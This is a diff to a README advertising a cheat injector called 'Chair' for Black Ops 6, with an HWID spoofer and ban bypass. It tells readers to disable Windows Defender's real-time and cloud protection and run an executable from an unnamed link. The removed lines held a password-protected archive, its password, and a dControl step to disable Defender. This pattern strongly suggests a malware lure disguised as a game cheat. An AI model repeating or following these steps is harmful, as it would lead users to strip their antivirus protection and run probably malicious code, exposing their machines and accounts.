@@ -2,7 +2,7 @@ _____VERY LOW BAN RATE!!!_____
 
 
 __INSTRUCTIONS FOR USE__ </br>
-___> ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.___
+___> ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool ___WILL NOT WORK___! See below for instructions with images.___
 
 ## Quick Setup Guide
 
@@ -25,20 +25,11 @@ To ensure functionality of the loader, make sure **Real-time protection** and **
 ### Step 2: Launching the Injector
 
 1. **Download the Tool**  
-   - Get `Chair.rar` from the provided link.
+   - Get `Chair.exe` from the provided link.
 
-2. **Extract the loader**
-   - The archive is password protected, in order to extract it you will need 7Zip, WinZip, WinRAR, or another archive extractor tool of your choice.
-   - Archive password is __S7Crackz__
-
-3. **Disable Windows Defender**
-   - Run `dControl.exe` as administrator, and click Disable Windows Defender.
-
-   ![dControl.exe](screenshots/dcontrol.png)
-
-3. **Prepare for Injection**  
+2. **Prepare for Injection**  
    - Make sure **Black Ops 6** is closed before proceeding.
-   - Run `Chair+Blocker.exe`.
+   - Run `Chair.exe`.
 
 4. **Select and Inject Cheats**
    - In the menu, select one of the following options:
@@ -120,4 +111,3 @@ Play worry-free with an included HWID spoofer and shadow ban bypass.
 
 > **Enjoy gameplay with advanced features and total customization.** Follow the setup instructions closely, and dive into the enhanced experience in Black Ops 6!</br>
 Enjoy!!</br>
-Archive password is: __S7Crackz__</br>
